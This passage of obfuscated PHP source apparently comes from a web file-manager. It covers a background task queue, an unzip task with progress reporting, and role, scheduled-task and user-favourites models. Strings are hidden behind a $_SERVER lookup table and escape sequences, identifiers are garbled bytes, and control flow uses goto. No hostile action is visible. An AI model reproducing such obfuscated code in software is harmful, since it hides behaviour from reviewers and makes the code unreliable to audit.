$_SERVER[öæÛ¿©¿]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($•Ò‚ş”¨[2034] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $•Ò‚ş”¨[12], $•Ò‚ş”¨[536])), $•Ò‚ş”¨[196]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($Ë’¿ß, $Í¡İĞ²› = array(), $•ö‡¹ğò = '', $ñì…ëæ = '') { $µ ‰æ Ô =& $_SERVER[öæÛ¿©¿]; if (self::count() >= self::MAX_LENGTH) { return !1; } $â‘šÁ€˜ = self::getAll(); if ($ñì…ëæ && array_find_by_field($â‘šÁ€˜, $µ ‰æ Ô[95], $ñì…ëæ)) { return !0; } $â‘šÁ€˜[] = array($µ ‰æ Ô[343] => $Ë’¿ß, $µ ‰æ Ô[2033] => $Í¡İĞ²›, $µ ‰æ Ô[536] => $•ö‡¹ğò, $µ ‰æ Ô[95] => $ñì…ëæ); self::setAll($â‘šÁ€˜); write_log($µ ‰æ Ô[2034] . $•ö‡¹ğò, $µ ‰æ Ô[196]); return !0; } public static function run() { $‘ï×¢Âá =& $_SERVER[öæÛ¿©¿]; $³ùıïêÏ = self::getAll(); $„Æè¦•€ = array_shift($³ùıïêÏ); if (!$„Æè¦•€) { return !1; } self::setAll($³ùıïêÏ); $”‰¾² = timeFloat(); $Ÿ‰Ú ² = $‘ï×¢Âá[12]; try { $Ÿ‰Ú ² = Hook::apply($„Æè¦•€[$‘ï×¢Âá[343]], $„Æè¦•€[$‘ï×¢Âá[2033]]); } catch (Exception $ ·´Ü) { write_log($ ·´Ü, $‘ï×¢Âá[1313]); } $–å±ƒÒª = number_format(timeFloat() - $”‰¾², 3) . $‘ï×¢Âá[1940]; if ($Ÿ‰Ú ² && is_string($Ÿ‰Ú ²)) { $–å±ƒÒª = $–å±ƒÒª . $‘ï×¢Âá[2035] . $Ÿ‰Ú ²; } write_log($‘ï×¢Âá[2036] . $„Æè¦•€[$‘ï×¢Âá[536]] . $‘ï×¢Âá[2037] . $–å±ƒÒª, $‘ï×¢Âá[196]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $´üŞ»®ì =& $_SERVER[öæÛ¿©¿]; $ÖğíÙ€ä = self::threadCount() + 1; if ($ÖğíÙ€ä > 3 || !self::count()) { return; } write_log($´üŞ»®ì[2038] . $ÖğíÙ€ä, $´üŞ»®ì[196]); Cache::set(self::QUEUE_THREAD, $ÖğíÙ€ä, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($´üŞ»®ì[2039], $´üŞ»®ì[196]); } public static function getKey($ŸËÖéì, $ÛóŸÁ˜ = "\151\x6e\164") { $ƒÆ‡· =& $_SERVER[öæÛ¿©¿]; Cache::removeMemory($ŸËÖéì); $ÖÅÛé… = Cache::get($ŸËÖéì); if ($ÛóŸÁ˜ == $ƒÆ‡·[365]) { return $ÖÅÛé… ? intval($ÖÅÛé…) : 0; } if ($ÛóŸÁ˜ == $ƒÆ‡·[2040]) { return is_array($ÖÅÛé…) ? $ÖÅÛé… : array(); } return $ÖÅÛé…; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[öæÛ¿©¿][2040]); } public static function setAll($­éûşœŠ) { $ÉåƒÈç— = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($­éûşœŠ), $ÉåƒÈç—); Cache::set(self::QUEUE_DATA, $­éûşœŠ, $ÉåƒÈç—); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($í ­ÄêÉ, $Ù—“ı“Ğ = 5.0) { if (!$í ­ÄêÉ) { return; } $®ÍëúŠó = Cache::get($í ­ÄêÉ); if (!$®ÍëúŠó || timeFloat() - floatVal($®ÍëúŠó) >= $Ù—“ı“Ğ) { Cache::set($í ­ÄêÉ, timeFloat(), $Ù—“ı“Ğ * 10); return !0; } return !1; } public static function timeLimitCall($¦·¶””, $ĞŒ•šé, $™Ö‘éñæ, $¥¦Ô“ú¼ = 5.0) { $¤º¿¦ƒ™ =& $_SERVER[öæÛ¿©¿]; if (!$¦·¶”” || !$ĞŒ•šé) { return; } self::$asyncAdd = !0; $ğ¸óùÅì = $¤º¿¦ƒ™[2041]; $Ûô™¿èß = Cache::get($ğ¸óùÅì, !0); $£ŒÖãË = array($¤º¿¦ƒ™[2042] => timeFloat(), $¤º¿¦ƒ™[2043] => timeFloat(), $¤º¿¦ƒ™[343] => $ĞŒ•šé, $¤º¿¦ƒ™[2033] => $™Ö‘éñæ, $¤º¿¦ƒ™[2044] => $¥¦Ô“ú¼); if (is_array($Ûô™¿èß[$¦·¶””])) { if (timeFloat() - $Ûô™¿èß[$¦·¶””][$¤º¿¦ƒ™[2042]] <= $£ŒÖãË[$¤º¿¦ƒ™[2044]] * 0.5) { return; } $£ŒÖãË[$¤º¿¦ƒ™[2043]] = $Ûô™¿èß[$¦·¶””][$¤º¿¦ƒ™[2043]]; } $Ûô™¿èß[$¦·¶””] = $£ŒÖãË; Cache::set($ğ¸óùÅì, $Ûô™¿èß, 60); Cache::removeMemory($ğ¸óùÅì); write_log($¤º¿¦ƒ™[2045] . $¦·¶”” . $¤º¿¦ƒ™[74] . $ĞŒ•šé . $¤º¿¦ƒ™[2046] . ACTION, $¤º¿¦ƒ™[196]); } public static function timeLimitCallLoop() { $Òá½Á€× =& $_SERVER[öæÛ¿©¿]; $Üµ“¹•ß = array($Òá½Á€×[2047]); $üØ¡Çî = in_array(strtolower(ACTION), $Üµ“¹•ß); if (!$üØ¡Çî && !self::$asyncAdd) { return; } $“íñË¥ = $Òá½Á€×[2041]; $½‘¦£É = Cache::get($“íñË¥, !0); if (!$½‘¦£É || count($½‘¦£É) <= 0) { return; } $õ¤ê‹íß = timeFloat(); $ßŒ°æšÍ = array(); $ËæÈ½»… = array(); foreach ($½‘¦£É as $‘ˆ‡ï§ => $÷®Š´éæ) { if ($õ¤ê‹íß - $÷®Š´éæ[$Òá½Á€×[2043]] > $÷®Š´éæ[$Òá½Á€×[2044]]) { $ËæÈ½»…[$‘ˆ‡ï§] = $÷®Š´éæ; continue; } $ßŒ°æšÍ[$‘ˆ‡ï§] = $÷®Š´éæ; } if (count($ËæÈ½»…) == 0) { return; } if (count($ßŒ°æšÍ) == 0) { Cache::remove($“íñË¥); } else { Cache::set($“íñË¥, $ßŒ°æšÍ, 60); } Cache::removeMemory($“íñË¥); self::runArr($ËæÈ½»…); } public static function finished($¦„ªúµÉ, $ê·Æ•¸Ê) { $”“¦É‘ˆ =& $_SERVER[öæÛ¿©¿]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($”“¦É‘ˆ[343] => $¦„ªúµÉ, $”“¦É‘ˆ[2033] => $ê·Æ•¸Ê); } private static function runArr($©û…¤ïğ) { $€™è¦î =& $_SERVER[öæÛ¿©¿]; if (!$©û…¤ïğ) { return; } foreach ($©û…¤ïğ as $ÙÚ¥”¦„ => $¤ß‘ãó÷) { try { Hook::apply($¤ß‘ãó÷[$€™è¦î[343]], $¤ß‘ãó÷[$€™è¦î[2033]]); write_log($€™è¦î[2048] . $ÙÚ¥”¦„ . $€™è¦î[74] . $¤ß‘ãó÷[$€™è¦î[343]] . $€™è¦î[2046] . ACTION, $€™è¦î[196]); } catch (Exception $à—†‡ß„) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¦‘ó™µî =& $_SERVER[öæÛ¿©¿]; parent::startAfter(); Hook::bind($¦‘ó™µî[2049], array($this, $¦‘ó™µî[2050])); Hook::bind($¦‘ó™µî[1326], array($this, $¦‘ó™µî[2051])); Hook::bind($¦‘ó™µî[2052], array($this, $¦‘ó™µî[2053])); $õƒ’‡Ğ =& $this->task; $õƒ’‡Ğ[$¦‘ó™µî[2054]] = $¦‘ó™µî[1327]; if (!$õƒ’‡Ğ[$¦‘ó™µî[1813]]) { $õƒ’‡Ğ[$¦‘ó™µî[1813]] = LNG($¦‘ó™µî[2055]); } } protected function endAfter() { $ÉÒÌ´ö =& $_SERVER[öæÛ¿©¿]; parent::endAfter(); Hook::unbind($ÉÒÌ´ö[2049], array($this, $ÉÒÌ´ö[2050])); Hook::unbind($ÉÒÌ´ö[1326], array($this, $ÉÒÌ´ö[2051])); Hook::unbind($ÉÒÌ´ö[2052], array($this, $ÉÒÌ´ö[2053])); } public function updateAfter() { $–©¥«µ° =& $_SERVER[öæÛ¿©¿]; $¯å§¬¦ =& $this->task; if (!$¯å§¬¦[$–©¥«µ°[1174]] || !$¯å§¬¦[$–©¥«µ°[856]]) { if ($¯å§¬¦[$–©¥«µ°[2054]] != $–©¥«µ°[389]) { return; } } if ($¯å§¬¦[$–©¥«µ°[2054]] == $–©¥«µ°[1327]) { $‰ƒæÕ¨Á = 0; if ($¯å§¬¦[$–©¥«µ°[1978]]) { $‰ƒæÕ¨Á = $¯å§¬¦[$–©¥«µ°[1979]] / $¯å§¬¦[$–©¥«µ°[1978]]; } $¯å§¬¦[$–©¥«µ°[1926]] = $‰ƒæÕ¨Á * 0.3; } else { if ($¯å§¬¦[$–©¥«µ°[2054]] == $–©¥«µ°[389]) { $‰ƒæÕ¨Á = $¯å§¬¦[$–©¥«µ°[1925]] / $¯å§¬¦[$–©¥«µ°[1174]]; $¯å§¬¦[$–©¥«µ°[1926]] = 0.3 + $‰ƒæÕ¨Á * 0.4; } else { if ($¯å§¬¦[$–©¥«µ°[2054]] == $–©¥«µ°[108]) { $µ†´ÓÖç = 0; if ($¯å§¬¦[$–©¥«µ°[1980]] == $–©¥«µ°[108]) { $µ†´ÓÖç = $¯å§¬¦[$–©¥«µ°[1979]]; } $‰ƒæÕ¨Á = ($¯å§¬¦[$–©¥«µ°[1983]] + $µ†´ÓÖç) / $¯å§¬¦[$–©¥«µ°[856]]; $¯å§¬¦[$–©¥«µ°[1926]] = 0.3 + 0.4 + $‰ƒæÕ¨Á * 0.3; } } } if ($¯å§¬¦[$–©¥«µ°[1926]] > 0) { $¸¶©øç¡ = timeFloat() - $¯å§¬¦[$–©¥«µ°[1928]] - $¯å§¬¦[$–©¥«µ°[1931]]; $¯å§¬¦[$–©¥«µ°[1932]] = $¸¶©øç¡ * (1 - $¯å§¬¦[$–©¥«µ°[1926]]) / $¯å§¬¦[$–©¥«µ°[1926]]; } } public function addFile($Î³ØÍ§) { $ìôáÍà =& $_SERVER[öæÛ¿©¿]; $æÓõ»Ë¬ =& $this->task; $ÚœË£­¢ = IO::info($Î³ØÍ§); $æÓõ»Ë¬[$ìôáÍà[1976]] = $ÚœË£­¢[$ìôáÍà[32]]; $æÓõ»Ë¬[$ìôáÍà[1978]] = $ÚœË£­¢[$ìôáÍà[79]]; $æÓõ»Ë¬[$ìôáÍà[1979]] = 0; $æÓõ»Ë¬[$ìôáÍà[1176]] = $ìôáÍà[2007]; $æÓõ»Ë¬[$ìôáÍà[1980]] = $ìôáÍà[1327]; $æÓõ»Ë¬[$ìôáÍà[856]] = $ÚœË£­¢[$ìôáÍà[79]]; $æÓõ»Ë¬[$ìôáÍà[1174]] = 1; $ÇÕ¤Çµ = 0; $æÓõ»Ë¬[$ìôáÍà[1989]] = array($ìôáÍà[1990] => $ÇÕ¤Çµ + 1, $ìôáÍà[505] => $ÚœË£­¢[$ìôáÍà[32]], $ìôáÍà[87] => $ÚœË£­¢[$ìôáÍà[87]], $ìôáÍà[598] => $ÚœË£­¢[$ìôáÍà[598]] ? $ÚœË£­¢[$ìôáÍà[598]] : $ÚœË£­¢[$ìôáÍà[87]]); $this->update(); } public function zipEvent($«ÑùüÊ², $€¹óŠµá, $î¨÷†’©, $–®ğèÒÒ) { $İÁ³àÉ =& $_SERVER[öæÛ¿©¿]; $õ‘‰é·å =& $this->task; $õ‘‰é·å[$İÁ³àÉ[1976]] = get_path_this($€¹óŠµá); $õ‘‰é·å[$İÁ³àÉ[1978]] = $–®ğèÒÒ; $õ‘‰é·å[$İÁ³àÉ[1979]] = $î¨÷†’©; $õ‘‰é·å[$İÁ³àÉ[1176]] = $«ÑùüÊ² == $İÁ³àÉ[2056] ? $İÁ³àÉ[2057] : $İÁ³àÉ[2058]; $õ‘‰é·å[$İÁ³àÉ[1980]] = $İÁ³àÉ[12]; $õ‘‰é·å[$İÁ³àÉ[856]] = $–®ğèÒÒ; $õ‘‰é·å[$İÁ³àÉ[2054]] = $İÁ³àÉ[389]; $this->update(); } public function unzipAfter($£º‰²’Ó) { $½Êº¹¥ =& $_SERVER[öæÛ¿©¿]; $ü¤‰şõ =& $this->task; $ü¤‰şõ[$½Êº¹¥[2054]] = $½Êº¹¥[108]; $’àëê¶ = IO::infoWithChildren($£º‰²’Ó); $ˆ›Ğ©Ş° = 0; $ü¤‰şõ[$½Êº¹¥[1989]] = array($½Êº¹¥[1990] => $ˆ›Ğ©Ş° + 1, $½Êº¹¥[505] => $’àëê¶[$½Êº¹¥[32]], $½Êº¹¥[87] => $’àëê¶[$½Êº¹¥[87]], $½Êº¹¥[598] => $’àëê¶[$½Êº¹¥[598]] ? $’àëê¶[$½Êº¹¥[598]] : $’àëê¶[$½Êº¹¥[87]]); if ($’àëê¶[$½Êº¹¥[33]] == $½Êº¹¥[231]) { $ü¤‰şõ[$½Êº¹¥[1174]] = 1; } else { $ü¤‰şõ[$½Êº¹¥[1174]] = $’àëê¶[$½Êº¹¥[82]][$½Êº¹¥[80]]; } $ü¤‰şõ[$½Êº¹¥[1176]] = $½Êº¹¥[12]; $ü¤‰şõ[$½Êº¹¥[1980]] = 0; $ü¤‰şõ[$½Êº¹¥[1925]] = 0; $ü¤‰şõ[$½Êº¹¥[1978]] = 0; $ü¤‰şõ[$½Êº¹¥[1979]] = 0; $ü¤‰şõ[$½Êº¹¥[1976]] = $½Êº¹¥[12]; $ü¤‰şõ[$½Êº¹¥[1983]] = 0; $ü¤‰şõ[$½Êº¹¥[856]] = $’àëê¶[$½Êº¹¥[79]]; $this->update(); self::log($½Êº¹¥[2059] . json_encode(array($ü¤‰şõ, $’àëê¶))); } public function nameParse($Õ²Ğ»Ô) { $ªÒû³ =& $_SERVER[öæÛ¿©¿]; $üÒ“ãÔ± =& $this->task; if ($üÒ“ãÔ±[$ªÒû³[2054]] == $ªÒû³[1327]) { $üÒ“ãÔ±[$ªÒû³[2054]] = $ªÒû³[389]; $üÒ“ãÔ±[$ªÒû³[1983]] = 0; $üÒ“ãÔ±[$ªÒû³[856]] = 0; } $éèÁˆÙ = get_path_this($Õ²Ğ»Ô); if (strstr($éèÁˆÙ, $ªÒû³[10])) { $üÒ“ãÔ±[$ªÒû³[1925]] += 1; $üÒ“ãÔ±[$ªÒû³[1174]] += 1; } $üÒ“ãÔ±[$ªÒû³[1976]] = $Õ²Ğ»Ô; $this->update(); } } goto dÀ×š˜êÊš; Cº¨¨ÆéÁò: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\162\x6f\154\x65\114\151\163\x74"; public $field = array("\156\x61\155\x65", "\141\165\164\150", "\154\x61\142\145\154", "\144\x69\163\160\x6c\141\x79", "\x73\x79\163\164\x65\155", "\x64\x65\163\143", "\x69\x67\x6e\157\162\x65\x45\x78\164", "\151\147\156\157\x72\x65\x46\151\154\x65\123\x69\x7a\145", "\141\x64\x6d\x69\156\151\x73\164\162\141\x74\157\x72", "\163\157\162\164"); public function listData($şî×ãÆ¥ = false, $£ÊîØÉõ = "\163\157\162\164", $œµŸ½Á¤ = false) { $¶İ¯ÀØ¼ =& $_SERVER[öæÛ¿©¿]; $¬•¢Ş¼¼ = parent::listData($şî×ãÆ¥, $£ÊîØÉõ, $œµŸ½Á¤); if (!$şî×ãÆ¥) { foreach ($¬•¢Ş¼¼ as $Ø‚£˜ø¨ => $ŸÇ×ùÆ) { if ($ŸÇ×ùÆ[$¶İ¯ÀØ¼[2324]] == 1) { $¬•¢Ş¼¼[$Ø‚£˜ø¨][$¶İ¯ÀØ¼[536]] = LNG($¶İ¯ÀØ¼[2614]); } } } return $¬•¢Ş¼¼; } public function update($›¥†ÖŞç, $ºñ¤ˆ³å) { $™®åËö =& $_SERVER[öæÛ¿©¿]; $Ôš¯…³× = parent::listData($›¥†ÖŞç); $¡ŠëŒœ¸ = $this->findByName($ºñ¤ˆ³å[$™®åËö[32]]); if (!$Ôš¯…³× || $¡ŠëŒœ¸ && $¡ŠëŒœ¸[$™®åËö[483]] != $Ôš¯…³×[$™®åËö[483]]) { return !1; } if ($¡ŠëŒœ¸[$™®åËö[2324]] == 1) { $ºñ¤ˆ³å = array($™®åËö[32] => $ºñ¤ˆ³å[$™®åËö[32]], $™®åËö[2152] => $ºñ¤ˆ³å[$™®åËö[2152]]); } $this->filterAuth($ºñ¤ˆ³å[$™®åËö[498]]); return parent::update($›¥†ÖŞç, $ºñ¤ˆ³å); } public function remove($û™Í³™Ÿ) { $á‹üüı = parent::listData($û™Í³™Ÿ); if (!$á‹üüı || $á‹üüı[$_SERVER[öæÛ¿©¿][190]]) { return !1; } return parent::remove($û™Í³™Ÿ); } public function add($™ÚŠÃı) { $•ÇÓ·ÎÃ =& $_SERVER[öæÛ¿©¿]; $®îÖº¥ = $™ÚŠÃı[$•ÇÓ·ÎÃ[32]]; if ($this->findByName($®îÖº¥)) { return !1; } $Š‘“¤¶Õ = array($•ÇÓ·ÎÃ[505] => $®îÖº¥, $•ÇÓ·ÎÃ[2137] => $•ÇÓ·ÎÃ[12], $•ÇÓ·ÎÃ[2133] => $•ÇÓ·ÎÃ[2141], $•ÇÓ·ÎÃ[2615] => 1, $•ÇÓ·ÎÃ[2136] => 0, $•ÇÓ·ÎÃ[2616] => 0, $•ÇÓ·ÎÃ[2135] => $this->getSort()); $™ÚŠÃı = array_merge($Š‘“¤¶Õ, $™ÚŠÃı); $this->filterAuth($™ÚŠÃı[$•ÇÓ·ÎÃ[498]]); return parent::insert($™ÚŠÃı); } private function getSort() { $ó˜ã÷—¤ =& $_SERVER[öæÛ¿©¿]; $›Òø·«± = parent::listData(); $æË¯±ÕØ = array_to_keyvalue($›Òø·«±, $ó˜ã÷—¤[12], $ó˜ã÷—¤[2153]); return empty($æË¯±ÕØ) ? 0 : max($æË¯±ÕØ) + 1; } private function filterAuth(&$ÏÅÒöÚ) { $ü¢ŠÙíÔ =& $_SERVER[öæÛ¿©¿]; $›çËË˜… = array(); $ã¤òóËÍ = array_filter(explode($ü¢ŠÙíÔ[50], $ÏÅÒöÚ)); foreach ($ã¤òóËÍ as $ÏÅÒöÚ) { $îù Ë  = explode($ü¢ŠÙíÔ[10], $ÏÅÒöÚ); if ($îù Ë [0] == $ü¢ŠÙíÔ[2617] && $îù Ë [1] != $ü¢ŠÙíÔ[1251]) { $™ìèÇ¯€ = $îù Ë [0] . $ü¢ŠÙíÔ[10] . $îù Ë [1] . $ü¢ŠÙíÔ[2618]; if (!in_array($™ìèÇ¯€, $ã¤òóËÍ)) { $›çËË˜…[] = $™ìèÇ¯€; } } $›çËË˜…[] = $ÏÅÒöÚ; } $ÏÅÒöÚ = implode($ü¢ŠÙíÔ[50], $›çËË˜…); } public function findRoleDefault() { $®ù¨ô =& $_SERVER[öæÛ¿©¿]; $ç¸†÷—‡ = parent::listData(); $êø“Úî = !1; foreach ($ç¸†÷—‡ as $–˜ƒ®‡ß) { if (!$–˜ƒ®‡ß || $–˜ƒ®‡ß[$®ù¨ô[2151]] == $®ù¨ô[229] || $–˜ƒ®‡ß[$®ù¨ô[2324]] == 1) { continue; } if (strstr($–˜ƒ®‡ß[$®ù¨ô[498]], $®ù¨ô[2619])) { continue; } if (!strstr($–˜ƒ®‡ß[$®ù¨ô[498]], $®ù¨ô[2620])) { continue; } if (!$êø“Úî) { $êø“Úî = $–˜ƒ®‡ß; continue; } $á‹ÊÑäÅ = explode($®ù¨ô[50], $êø“Úî[$®ù¨ô[498]]); $“·ê‹¼½ = explode($®ù¨ô[50], $–˜ƒ®‡ß[$®ù¨ô[498]]); if (count($á‹ÊÑäÅ) > count($“·ê‹¼½)) { $êø“Úî = $–˜ƒ®‡ß; } } return $êø“Úî ? $êø“Úî[$®ù¨ô[483]] : $®ù¨ô[12]; } public function sort($Í›¼…Áì, $’Œ™×Â) { return parent::update($Í›¼…Áì, $’Œ™×Â); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\x74\141\163\x6b\114\151\163\164"; public $field = array("\156\x61\155\145", "\164\x79\x70\x65", "\145\x76\145\x6e\164", "\x74\x69\155\x65", "\144\x65\163\x63", "\x73\171\163\x74\145\x6d", "\x65\x6e\x61\142\154\x65", "\x6c\x61\x73\164\122\165\156", "\163\x6f\x72\x74"); public function listData($«áâñá = false, $¿ªëÖ¯— = "\163\x6f\x72\x74", $ö†Œùü = false) { return parent::listData($«áâñá, $¿ªëÖ¯—, $ö†Œùü); } public function add($ŠãêÒ¬Î) { $Ğ§úßÈ =& $_SERVER[öæÛ¿©¿]; $÷¹ÉÀ”ç = $this->findByName($ŠãêÒ¬Î[$Ğ§úßÈ[32]]); if ($÷¹ÉÀ”ç) { return !1; } $ŠãêÒ¬Î[$Ğ§úßÈ[1876]] = 0; $ŠãêÒ¬Î[$Ğ§úßÈ[2153]] = $this->getSort(); return parent::insert($ŠãêÒ¬Î); } private function getSort() { $»¨û”ïÓ =& $_SERVER[öæÛ¿©¿]; $õğàÜÍë = parent::listData(); $õÒ¸€·„ = array_to_keyvalue($õğàÜÍë, $»¨û”ïÓ[12], $»¨û”ïÓ[2153]); return empty($õÒ¸€·„) ? 0 : max($õÒ¸€·„) + 1; } public function update($øØ£¤Ï, $Æ±ôÆ€Ş) { $àÆÊ§‘ =& $_SERVER[öæÛ¿©¿]; $ã±¯Üú = $this->listData($øØ£¤Ï); $İÔèÙã® = $this->findByName($Æ±ôÆ€Ş[$àÆÊ§‘[32]]); if (!$ã±¯Üú || $İÔèÙã® && $İÔèÙã®[$àÆÊ§‘[483]] != $ã±¯Üú[$àÆÊ§‘[483]]) { return !1; } return parent::update($øØ£¤Ï, $Æ±ôÆ€Ş); } public function remove($ºùõ¸É÷, $’±ü™†° = false) { $ÏßÀ¼ÎÉ =& $_SERVER[öæÛ¿©¿]; $‹šèÒäñ = $this->listData($ºùõ¸É÷); if (!$‹šèÒäñ) { return; } if (!$’±ü™†° && $‹šèÒäñ[$ÏßÀ¼ÎÉ[190]] == $ÏßÀ¼ÎÉ[91]) { return !1; } return parent::remove($ºùõ¸É÷); } public function enable($ê¿¯Õ†´, $‚ßà‰Ô) { return $this->update($ê¿¯Õ†´, array($_SERVER[öæÛ¿©¿][2609] => $‚ßà‰Ô)); } public function run($¨Ä‹†“¥) { return $this->update($¨Ä‹†“¥, array($_SERVER[öæÛ¿©¿][2621] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($±ó‹©Î€) { $ß€€Ôâ =& $_SERVER[öæÛ¿©¿]; return array($ß€€Ôâ[2243] => array(USER_ID, $ß€€Ôâ[2622])); } protected function ___listData() { $ğñ‡ğÕÓ =& $_SERVER[öæÛ¿©¿]; $¿Å–‰µ = array($ğñ‡ğÕÓ[1916] => USER_ID, $ğñ‡ğÕÓ[569] => 0); $ÑŠ”š¡Ó = $ğñ‡ğÕÓ[2623]; $ò»°ñÃ¸ = $this->field($ÑŠ”š¡Ó)->where($¿Å–‰µ)->order($ğñ‡ğÕÓ[2624])->select(); return $ò»°ñÃ¸ ? $ò»°ñÃ¸ : array(); } protected function resetCache() { } protected function listView() { $–öÓ üõ =& $_SERVER[öæÛ¿©¿]; $¼â¸ïø = $this->listData(); $¶íß´Ôç = array_filter_by_field($¼â¸ïø, $–öÓ üõ[33], $–öÓ üõ[501]); $øÂ¥åò = array_to_keyvalue($¶íß´Ôç, $–öÓ üõ[12], $–öÓ üõ[87]); if (!$øÂ¥åò) { return $¼â¸ïø; } $¼§Øôê  = 2000; $¹‡°Š’ = array($–öÓ üõ[502] => array($–öÓ üõ[503], $øÂ¥åò)); $Á¸¸Ô†ä = Model($–öÓ üõ[925])->listSource($¹‡°Š’, $¼§Øôê ); $Á¸¸Ô†ä = array_merge($Á¸¸Ô†ä[$–öÓ üõ[86]], $Á¸¸Ô†ä[$–öÓ üõ[85]]); $Á¸¸Ô†ä = array_to_keyvalue($Á¸¸Ô†ä, $–öÓ üõ[192]); foreach ($¼â¸ïø as $£‹û“† => $Â”¤ª°») { $‚Û—¿ø™ = $Á¸¸Ô†ä[$Â”¤ª°»[$–öÓ üõ[87]]]; $‚Û—¿ø™ = $‚Û—¿ø™ ? $‚Û—¿ø™ : array(); $¼â¸ïø[$£‹û“†] = array_merge($‚Û—¿ø™, $Â”¤ª°»); } return $¼â¸ïø; } protected function addFav($˜«Èı½û, $¹­Ó¾²» = '', $òş¬Š ¡ = "\x73\157\x75\162\143\145") { $Ÿ¦Ñê“½ =& $_SERVER[öæÛ¿©¿]; $÷…éµ¿ó = array($Ÿ¦Ñê“½[1916] => USER_ID, $Ÿ¦Ñê“½[569] => 0, $Ÿ¦Ñê“½[507] => $òş¬Š ¡, $Ÿ¦Ñê“½[506] => $˜«Èı½û); if ($this->where($÷…éµ¿ó)->find()) { return !1; } $÷…éµ¿ó = array($Ÿ¦Ñê“½[1916] => USER_ID, $Ÿ¦Ñê“½[569] => 0); $¹¡˜ãŞ = $this->where($÷…éµ¿ó)->max($Ÿ¦Ñê“½[2153]); if (!$¹¡˜ãŞ) { $¹¡˜ãŞ = 0; } if (!$¹­Ó¾²» && $òş¬Š ¡ == $Ÿ¦Ñê“½[501]) { $ß»Ö×¡µ = Model($Ÿ¦Ñê“½[1478])->where(array($Ÿ¦Ñê“½[502] => $˜«Èı½û))->find(); if (!$ß»Ö×¡µ) { return !1; } $¹­Ó¾²» = $ß»Ö×¡µ[$Ÿ¦Ñê“½[32]]; } $¹­Ó¾²» = $this->getAutoName($¹­Ó¾²»); $”êû“À‡ = array($Ÿ¦Ñê“½[1916] => USER_ID, $Ÿ¦Ñê“½[569] => 0, $Ÿ¦Ñê“½[505] => $¹­Ó¾²», $Ÿ¦Ñê“½[506] => $˜«Èı½û, $Ÿ¦Ñê“½[507] => $òş¬Š ¡, $Ÿ¦Ñê“½[2135] => $¹¡˜ãŞ + 1); return $this->add($”êû“À‡); } protected function remove($Èß–ı„Ñ) { $¤À©´ÊĞ =& $_SERVER[öæÛ¿©¿]; $©ÕÉŸ„‰ = array($¤À©´ÊĞ[1916] => USER_ID, $¤À©´ÊĞ[504] => $Èß–ı„Ñ); return $this->where($©ÕÉŸ„‰)->delete(); } protected function removeByName($‹½©Ù±†) { $‘Óİ˜şÚ =& $_SERVER[öæÛ¿©¿]; $§‡«Úè = array($‘Óİ˜şÚ[1916] => USER_ID, $‘Óİ˜şÚ[505] => $‹½©Ù±†, $‘Óİ˜şÚ[569] => 0); return $this->where($§‡«Úè)->delete(); } protected function rename($Á•”ñ¶, $Âİ£˜Œ·) { $ù¼ÀÇ =& $_SERVER[öæÛ¿©¿]; if ($Á•”ñ¶ == $Âİ£˜Œ·) { return !1; } $¶î«ªİ = $this->getAutoName($Âİ£˜Œ·); if ($Âİ£˜Œ· != $¶î«ªİ) { return !1; } $óƒŸ£óÓ = array($ù¼ÀÇ[1916] => USER_ID, $ù¼ÀÇ[569] => 0, $ù¼ÀÇ[32] => $Á•”ñ¶); return $this->where($óƒŸ£óÓ)->save(array($ù¼ÀÇ[32] => $Âİ£˜Œ·)); } protected function resetSort($¤Å¾Ìü’) { $ ü­¾Å¯ =& $_SERVER[öæÛ¿©¿]; $¤Å¾Ìü’ = is_array($¤Å¾Ìü’) ? $¤Å¾Ìü’ : array(); $ıú¡ÈÎì = array($ ü­¾Å¯[1916] => USER_ID); for ($˜îŸõöØ = 0; $˜îŸõöØ < count($¤Å¾Ìü’); $˜îŸõöØ++) { $ıú¡ÈÎì[$ ü­¾Å¯[504]] = $¤Å¾Ìü’[$˜îŸõöØ]; $this->where($ıú¡ÈÎì)->save(array($ ü­¾Å¯[2135] => $˜îŸõöØ + 1)); } return !0; } protected function moveTop($ïö•ò®Â) { $¸…—áœ =& $_SERVER[öæÛ¿©¿]; $Üî­±ïú = array($¸…—áœ[1916] => USER_ID, $¸…—áœ[569] => 0); $†Êï‡¨° = $this->where($Üî­±ïú)->where(array($¸…—áœ[32] => $ïö•ò®Â))->find(); if (!$†Êï‡¨°) { return; } $¸ƒ‹«© = $this->field($¸…—áœ[483])->where($Üî­±ïú)->order($¸…—áœ[2624])->select(); $¸ƒ‹«© = array_to_keyvalue($¸ƒ‹«©, $¸…—áœ[12], $¸…—áœ[483]); $æ—ØĞÊ = $¸ƒ‹«©; $¸ƒ‹«© = array_remove_value($¸ƒ‹«©, $†Êï‡¨°[$¸…—áœ[483]]); array_unshift($¸ƒ‹«©, $†Êï‡¨°[$¸…—áœ[483]]); return $this->resetSort($¸ƒ‹«©); } protected function moveBottom($–úï—Úµ) { $Äõ¬ú÷Ş =& $_SERVER[öæÛ¿©¿]; $¿“òş­¯ = array($Äõ¬ú÷Ş[1916] => USER_ID, $Äõ¬ú÷Ş[569] => 0); 